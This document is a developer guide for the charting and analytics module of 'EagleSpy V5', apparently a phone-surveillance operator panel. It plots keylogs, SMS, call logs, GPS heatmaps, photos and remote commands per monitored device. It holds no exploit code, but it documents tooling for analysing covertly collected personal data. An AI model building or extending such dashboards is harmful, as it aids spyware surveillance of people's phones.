# EagleSpy V5 - Data Visualization Guide

## Overview

The EagleSpy V5 Data Visualization system provides comprehensive analytics and interactive charts for monitoring device activity, location tracking, app usage, and communication patterns.

## Features

### 1. Interactive Charts

#### Activity Timeline
- **Type:** Multi-line chart
- **Data:** Commands, keylogs, SMS, and photos over time
- **Interactivity:** Hover for details, click to drill down
- **Export:** PNG, PDF

#### Location Heatmap
- **Type:** Interactive map with heatmap overlay
- **Data:** GPS coordinates with accuracy weighting
- **Features:** 
  - Auto-zoom to data bounds
  - Customizable heatmap radius/blur
  - Click markers for details

#### App Usage Statistics
- **Type:** Doughnut chart
- **Data:** Top 10 apps by usage count
- **Interactivity:** Click slice to view app details
- **Shows:** Percentage and absolute values

#### Call & SMS Statistics
- **Type:** Grouped bar chart
- **Data:** Calls, SMS sent, SMS received per day
- **Features:** Stacked or grouped view

#### Battery & Network Trends
- **Type:** Dual-axis line chart
- **Data:** Battery percentage and signal strength
- **Features:** Two Y-axes for different scales

### 2. Date Range Selection

**Preset Ranges:**
- Last 7 days
- Last 30 days
- Last 90 days
- Custom range (date picker)

**Usage:**
```javascript
// In your chart component
window.chartManager.setDateRange(30); // Last 30 days
```

### 3. Real-time Updates

Charts auto-refresh every 5 minutes via ActionCable WebSocket connection.

**Setup ActionCable subscription:**
```javascript
import consumer from "./channels/consumer"

consumer.subscriptions.create(
  { channel: "StatisticsChannel", device_id: deviceId },
  {
    received(data) {
      window.chartManager.renderAllCharts(data.data);
    }
  }
);
```

### 4. Export Functionality

**Export formats:**
- PNG (high-resolution)
- PDF (printable)

**Usage:**
```javascript
window.exportChart('activity-timeline-chart', 'png');
window.exportChart('app-usage-chart', 'pdf');
```

## Installation

### 1. Install Dependencies

```bash
npm install chart.js chartjs-adapter-date-fns date-fns html2canvas jspdf flatpickr
```

### 2. Import Chart Pack

Add to `app/javascript/packs/application.js`:

```javascript
import 'charts';
import 'stylesheets/charts';
```

### 3. Add Routes

Routes are auto-configured. The API endpoint is:
```
GET /devices/:id/statistics?days=30
```

### 4. Include CSS

The chart styles are automatically loaded via Webpacker.

## API Reference

### Statistics Endpoint

**GET** `/devices/:id/statistics`

**Parameters:**
- `days` (optional): Number of days to include (default: 30)

**Response:**
```json
{
  "status": "success",
  "data": {
    "activity_timeline": [...],
    "location_heatmap": [...],
    "app_usage": [...],
    "call_sms_stats": [...],
    "battery_network": [...],
    "overview": {...}
  }
}
```

### Data Structures

#### Activity Timeline
```javascript
{
  date: "2024-01-15",
  commands: 5,
  keylogs: 120,
  sms: 8,
  photos: 3
}
```

#### Location Heatmap
```javascript
{
  lat: 37.7749,
  lng: -122.4194,
  weight: 0.8
}
```

#### App Usage
```javascript
{
  label: "WhatsApp",
  value: 450
}
```

## Customization

### Chart Colors

Edit `app/javascript/packs/charts.js`:

```javascript
const colors = [
  '#3b82f6', // Blue
  '#8b5cf6', // Purple
  '#ec4899', // Pink
  // Add more colors
];
```

### Cache Duration

Edit `app/controllers/statistics_controller.rb`:

```ruby
@stats = Rails.cache.fetch("device_stats/#{@device.id}", expires_in: 10.minutes) do
  # ...
end
```

### Auto-refresh Interval

Edit `app/javascript/packs/charts.js`:

```javascript
// Change from 5 minutes to 2 minutes
setInterval(() => {
  window.chartManager.refreshCharts();
}, 2 * 60 * 1000);
```

## Performance Optimization

### 1. Database Indexing

Add indexes to improve query performance:

```ruby
# db/migrate/xxx_add_statistics_indexes.rb
add_index :keylogs, [:smartphone_id, :created_at]
add_index :sms_messages, [:smartphone_id, :created_at]
add_index :call_logs, [:smartphone_id, :created_at]
add_index :geo_locations, [:smartphone_id, :created_at]
add_index :pictures, [:smartphone_id, :created_at]
```

### 2. Redis Caching

Statistics are cached for 5 minutes by default. Monitor cache hit rates:

```ruby
# In Rails console
Rails.cache.stats
```

### 3. Background Processing

For large datasets, process statistics in background jobs:

```ruby
# app/jobs/statistics_calculation_job.rb
class StatisticsCalculationJob < ApplicationJob
  def perform(device_id, days_range = 30)
    device = Smartphone.find(device_id)
    stats = StatisticsService.new(device, days_range: days_range).calculate
    
    ActionCable.server.broadcast(
      "statistics:device:#{device_id}",
      { type: 'stats_update', data: stats }
    )
  end
end
```

## Troubleshooting

### Charts Not Rendering

1. Check browser console for JavaScript errors
2. Verify Chart.js is loaded: `typeof Chart !== 'undefined'`
3. Ensure canvas elements exist in DOM
4. Check network tab for API call failures

### Performance Issues

1. Reduce date range (e.g., 30 days instead of 90)
2. Increase cache duration
3. Add database indexes
4. Use background jobs for calculations

### ActionCable Not Connecting

1. Verify Redis is running
2. Check `config/cable.yml` configuration
3. Inspect WebSocket connection in browser DevTools
4. Check Rails logs for connection errors

## Examples

### Custom Chart Component

```javascript
class CustomChart {
  constructor(canvasId, data) {
    this.canvas = document.getElementById(canvasId);
    this.data = data;
    this.render();
  }

  render() {
    new Chart(this.canvas, {
      type: 'bar',
      data: this.data,
      options: {
        responsive: true,
        // ... your options
      }
    });
  }
}

// Usage
const chart = new CustomChart('my-chart', chartData);
```

### Drill-down Modal

```javascript
drillDownApp(app) {
  const modal = document.getElementById('drilldown-modal');
  const content = document.getElementById('drilldown-content');
  
  content.innerHTML = `
    <h2>${app.label}</h2>
    <p>Total usage: ${app.value}</p>
    <!-- Add more details -->
  `;
  
  modal.classList.add('active');
}
```

## Best Practices

1. **Cache aggressively**: Use Redis caching for expensive queries
2. **Limit data points**: Don't render more than 90 days on charts
3. **Lazy load**: Load charts only when tab/page is visible
4. **Debounce updates**: Prevent excessive re-renders
5. **Error handling**: Always handle API failures gracefully
6. **Accessibility**: Add ARIA labels to charts
7. **Mobile responsive**: Test on mobile devices

## Security Considerations

1. **Authentication**: Ensure statistics endpoints require authentication
2. **Authorization**: Verify user can access specific device data
3. **Rate limiting**: Use Rack::Attack to prevent abuse
4. **Input validation**: Sanitize date range parameters

## Future Enhancements

- [ ] Export all charts as single PDF report
- [ ] Email scheduled reports
- [ ] Anomaly detection alerts
- [ ] Predictive analytics
- [ ] Compare multiple devices
- [ ] Custom dashboard layouts
- [ ] Integration with external BI tools

## Support

For issues or questions:
1. Check GitHub Issues
2. Review Rails logs: `tail -f log/development.log`
3. Enable debug mode: `RAILS_ENV=development`

## License

This visualization system is part of EagleSpy V5 and follows the same license.
